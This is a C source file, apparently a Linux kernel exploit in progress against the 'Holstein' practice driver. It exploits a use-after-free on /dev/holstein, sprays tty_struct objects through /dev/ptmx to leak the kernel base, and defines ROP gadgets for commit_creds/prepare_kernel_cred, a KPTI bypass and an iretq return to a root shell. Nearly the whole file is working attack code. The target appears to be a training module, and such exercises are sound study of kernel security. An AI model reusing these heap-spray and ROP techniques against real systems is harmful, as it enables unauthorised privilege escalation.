#include <stdio.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
uint64_t kbase, g_buf, current;

#define ofs_tty_ops 0xc39c60
#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea)
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_pop_rcx (kbase + 0x0eb7e4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x0723c0)
#define addr_prepare_kernel_cred (kbase + 0x072560)
struct save_state
{
    uint64_t cs;
    uint64_t ss;
    uint64_t rsp;
    uint64_t rflags;
};

static struct save_state state;
void err(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stderr, "%s", "[!] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}
void info(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stdout, "%s", "[+] ");
    va_list args;
    va_start(args, format);
    vfprintf(stdout, format, args);
    va_end(args);
    fprintf(stdout, "%s", "\n");
}

void save_state(struct save_state *state)
{
    info("Saving state");
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(state->cs), "=r"(state->ss), "=r"(state->rsp), "=r"(state->rflags)
        :
        : "memory");
}

static void win()
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    info("You win!");
    execve("/bin/sh", argv, envp);
}

void restore_state(struct save_state *state, void (*f)())
{
    asm volatile("swapgs ;"
                 "movq %0, 0x20(%%rsp)\t\n"
                 "movq %1, 0x18(%%rsp)\t\n"
                 "movq %2, 0x10(%%rsp)\t\n"
                 "movq %3, 0x08(%%rsp)\t\n"
                 "movq %4, 0x00(%%rsp)\t\n"
                 "iretq"
                 :
                 : "r"(state->ss),
                   "r"(state->rsp),
                   "r"(state->rflags),
                   "r"(state->cs), "r"(f));
}
int main()
{
    save_state(&state);
    int fd1 = open("/dev/holstein", O_RDWR);
    if (fd1 == -1)
    {
        perror("open");
    }
    int fd2 = open("/dev/holstein", O_RDWR);
    if (fd2 == -1)
    {
        perror("open");
    }

    close(fd1);

    // spray the heap
    int spray[100];
    for (int i = 0; i < 50; i++)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            err("/dev/ptmx");
    }

    char buf[0x400];

    read(fd2, buf, sizeof(buf));
    kbase = *(uint64_t *)&buf[0x18] - ofs_tty_ops;
    info("kbase: 0x%llx\n", kbase);

    return 0;
}
